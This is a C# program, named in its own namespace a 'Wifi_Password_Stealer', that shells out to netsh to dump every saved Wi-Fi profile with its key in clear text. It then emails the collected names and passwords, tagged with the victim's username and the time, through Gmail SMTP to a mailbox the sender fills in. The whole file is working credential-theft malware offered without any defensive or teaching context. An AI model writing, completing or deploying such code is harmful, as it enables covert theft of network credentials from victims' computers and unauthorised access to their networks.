using System;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Mail;

namespace Wifi_Password_Stealer
{
    internal class Program
    {
        public static void Main(string[] args)
        {
            string[] profiles = GetProfiles();
            string[] passwords = GetWifiPasswords(profiles);

            string[] completeData = new string[profiles.Length];

            for (int i = 0; i < profiles.Length ; i++)
            {
                completeData[i] = "===== Profile nr."+(i+1)+" =====\n"+"Name: " + profiles[i] + "\n" + "Password: " + passwords[i];
            }

            SendEmail(completeData);
        }

        private static string[] GetWifiPasswords(string[] profiles)
        {
            string[] passwords = new string[(int) profiles.Length];
            int i = 0;
            
            foreach (string profile in profiles)
            {
                Process p = new Process();
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.Arguments = "/c netsh wlan show profile "+'"'+profile+'"'+" key=clear";
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.CreateNoWindow = false;
                p.Start();
            
                string result = p.StandardOutput.ReadToEnd();
                string[] splitedResult = result.Split(new[] {"\r\n", "\r", "\n"}, StringSplitOptions.None);

                foreach(string line in splitedResult)
                {
                    if (line.IndexOf("Key Content            : ") > 0)
                    {
                        passwords[i] = line.Substring(line.IndexOf("Key Content            : ")).Replace("Key Content            : ", "");
                        i++;
                    }
                }
                
                p.WaitForExit();
            }
            
            return passwords;
        }

        private static string[] GetProfiles()
        {
            Process p = new Process();
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c netsh wlan show profiles";
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.CreateNoWindow = false;
            p.Start();
            
            string result = p.StandardOutput.ReadToEnd();
            p.WaitForExit();

            string[] splitedResult = result.Split(new[] {"\r\n", "\r", "\n"}, StringSplitOptions.None);
            
            int i = 0;
            
            foreach(string line in splitedResult)
            {
                if (line.IndexOf(" : ") > 0)
                {
                    i++;
                }
            }
            
            string[] profiles = new String[i];;

            i = 0;

            foreach(string line in splitedResult)
            {
                if (line.IndexOf(" : ") > 0)
                {
                    profiles[i] = (line.Substring(line.IndexOf(" : ")).Replace(" : ", ""));
                    i++;
                }
            }
            
            return profiles;
        }

        private static void SendEmail(string[] Data)
        {
            string _Data = "";
            foreach (string line in Data)
            {
                _Data += line+"\n";
            }
            var fromAddress = new MailAddress("from Address", "from name");
            var toAddress = new MailAddress("to Address", "to name");
            string fromPassword = "from password";
            string subject = "Wifi Profiles from "+Environment.UserName+" ["+DateTime.Now+"]";
            string body = _Data;

            var smtp = new SmtpClient
            {
                Host = "smtp.gmail.com",
                Port = 587,
                EnableSsl = true,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                UseDefaultCredentials = false,
                Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
            };
            using (var message = new MailMessage(fromAddress, toAddress)
            {
                Subject = subject,
                Body = body
            })
            {
                smtp.Send(message);
            }
        }
    }
}
